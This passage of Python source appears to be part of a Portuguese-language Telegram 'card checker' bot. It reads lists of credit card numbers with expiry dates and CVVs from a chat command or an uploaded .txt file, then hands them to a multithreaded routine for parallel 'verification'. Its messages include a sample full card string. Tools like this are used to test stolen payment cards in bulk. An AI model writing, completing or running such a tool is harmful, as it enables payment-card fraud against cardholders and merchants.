        cc_text = message.text.replace('/mpp', '', 1).strip()
    
    # Padrão regex
    pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
    cc_list = re.findall(pattern, cc_text)
    
    if not cc_list:
        bot.reply_to(message, '''❌ Nenhum cartão válido encontrado!

Formatos aceitos:
• 5598880399683715|12|2026|602
• 5598880399683715|12|26|602''')
        return
    
    # Nome seguro
    user_name = message.from_user.first_name or "Usuario"
    safe_username = clean_text(user_name)
    
    print(f"🚀 /mpp iniciado: {len(cc_list)} cartões com {max_threads} threads")
    
    # Processar
    process_cc_list(chat_id, cc_list, f"Comando mpp - {safe_username}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Processa arquivo TXT com cartões"""
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Verificar se é arquivo .txt
        if not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Por favor, envie um arquivo .txt")
            return
        
        # Limpar nome do arquivo
        safe_filename = clean_text(message.document.file_name)
        
        # Processar arquivo
        file_content = downloaded_file.decode('utf-8')
        pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
        cc_list = re.findall(pattern, file_content)
        
        if not cc_list:
            bot.reply_to(message, "❌ Nenhum cartão válido encontrado no arquivo!")
            return
        
        print(f"📄 Arquivo processado: {safe_filename}, {len(cc_list)} cartões")
        
        # Iniciar processamento
        bot.reply_to(message, f"📄 Arquivo recebido: {safe_filename}\n"
                             f"🔍 Cartões encontrados: {len(cc_list)}\n"
                             f"🧵 Threads: {max_threads}\n"
                             f"⚡ Iniciando verificação PARALELA...")
        
        # Processar cartões
        process_cc_list(message.chat.id, cc_list, f"Arquivo: {safe_filename}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Erro ao processar arquivo: {str(e)}")

print("𝘾 𝙃 𝙆 𝕏 [ 𝙒 𝙄 𝙕 ] - Bot Iniciado com Sucesso ✅")
print(f"Threads configurados: {max_threads} (PARALELO REAL!)")
print("Modo Arquivo TXT Ativado ✅")
print("ThreadPoolExecutor Ativado ✅")
bot.polling()
